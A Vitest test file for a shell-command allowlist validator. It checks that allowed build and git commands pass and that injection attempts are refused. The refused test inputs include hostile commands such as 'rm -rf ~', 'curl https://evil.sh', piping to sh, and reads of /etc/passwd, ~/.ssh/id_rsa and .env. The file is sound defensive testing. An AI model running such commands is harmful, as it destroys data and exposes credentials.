import { describe, expect, it } from "vitest";
import { allowlistFor, toolchainFor, validate } from "./allowlist";

describe("allowed commands", () => {
  const allowed = [
    "pnpm install",
    "pnpm add zod",
    "pnpm build",
    "pnpm lint",
    "pnpm test",
    "pnpm exec tsc --noEmit",
    "ls src/app",
    "cat package.json",
    "grep -rn useState src",
    "git status",
    "git diff",
    "node -v",
  ];

  for (const cmd of allowed) {
    it(`allows ${cmd}`, () => {
      expect(validate(cmd, "node").ok).toBe(true);
    });
  }

  it("returns argv for the spawn call", () => {
    expect(validate("pnpm exec tsc --noEmit", "node")).toEqual({
      ok: true,
      argv: ["pnpm", "exec", "tsc", "--noEmit"],
    });
  });

  it("tolerates extra whitespace", () => {
    expect(validate("  pnpm    build  ", "node").ok).toBe(true);
  });
});

describe("shell metacharacter injection", () => {
  const attacks = [
    "pnpm build; rm -rf ~",
    "pnpm build && rm -rf /",
    "pnpm build || curl evil.sh",
    "pnpm build | sh",
    "pnpm build `rm -rf ~`",
    "pnpm build $(rm -rf ~)",
    "pnpm build > /etc/passwd",
    "pnpm build < /etc/passwd",
    "pnpm build\nrm -rf ~",
    "pnpm build\r\nrm -rf ~",
    "ls *",
    "cat ~/.ssh/id_rsa",
    "ls src && cat .env",
  ];

  for (const cmd of attacks) {
    it(`refuses ${JSON.stringify(cmd)}`, () => {
      expect(validate(cmd, "node").ok).toBe(false);
    });
  }

  it("refuses a null byte", () => {
    expect(validate("pnpm build\0rm -rf ~", "node").ok).toBe(false);
  });

  it("names the rejected character", () => {
    const result = validate("pnpm build; rm -rf ~", "node");
    if (result.ok) throw new Error("expected refusal");
    expect(result.reason).toContain(";");
  });
});

describe("commands outside the allowlist", () => {
  const refused = [
    "curl https://evil.sh",
    "wget https://evil.sh",
    "chmod 777 /",
    "sudo rm -rf /",
    "pnpm dlx some-package",
    "npx some-package",
    "rm -rf node_modules",
    "mv src /tmp",
    "echo hacked",
    "bash",
    "sh",
    "env",
  ];

  for (const cmd of refused) {
    it(`refuses ${cmd}`, () => {
      expect(validate(cmd, "node").ok).toBe(false);
    });
  }

  it("refuses a prefix that only looks allowed", () => {
    expect(validate("pnpmx build", "node").ok).toBe(false);
  });

  it("refuses an allowed binary with a disallowed subcommand", () => {
    expect(validate("git push origin main", "node").ok).toBe(false);
  });

  it("names the toolchain when refusing", () => {
    const result = validate("pytest", "node");
    if (result.ok) throw new Error("expected refusal");
    expect(result.reason).toContain("node");
  });
});

describe("path traversal", () => {
  for (const cmd of ["cat ../../../etc/passwd", "ls ..", "cat src/../../secrets"]) {
    it(`refuses ${cmd}`, () => {
      expect(validate(cmd, "node").ok).toBe(false);
    });
  }

  it("allows a relative path that stays inside", () => {
    expect(validate("cat src/app/page.tsx", "node").ok).toBe(true);
  });
});

describe("empty input", () => {
  for (const cmd of ["", "   ", "\n"]) {
    it(`refuses ${JSON.stringify(cmd)}`, () => {
      expect(validate(cmd, "node").ok).toBe(false);
    });
  }
});

describe("toolchain isolation", () => {
  it("refuses pnpm in a python session", () => {
    expect(validate("pnpm install", "python").ok).toBe(false);
  });

  it("refuses pytest in a node session", () => {
    expect(validate("pytest", "node").ok).toBe(false);
  });

  it("allows uv in a python session", () => {
    expect(validate("uv sync", "python").ok).toBe(true);
  });

  it("shares base commands across toolchains", () => {
    expect(validate("git status", "node").ok).toBe(true);
    expect(validate("git status", "python").ok).toBe(true);
  });
});

describe("toolchainFor", () => {
  it("maps every supported framework", () => {
    expect(toolchainFor("nextjs")).toBe("node");
    expect(toolchainFor("vite-react")).toBe("node");
    expect(toolchainFor("express")).toBe("node");
  });
});

describe("allowlistFor", () => {
  it("includes base plus its own toolchain only", () => {
    const node = allowlistFor("node");
    const python = allowlistFor("python");
    expect(node).toContainEqual(["pnpm", "build"]);
    expect(node).toContainEqual(["git", "status"]);
    expect(node).not.toContainEqual(["pytest"]);
    expect(python).toContainEqual(["pytest"]);
    expect(python).not.toContainEqual(["pnpm", "build"]);
  });
});
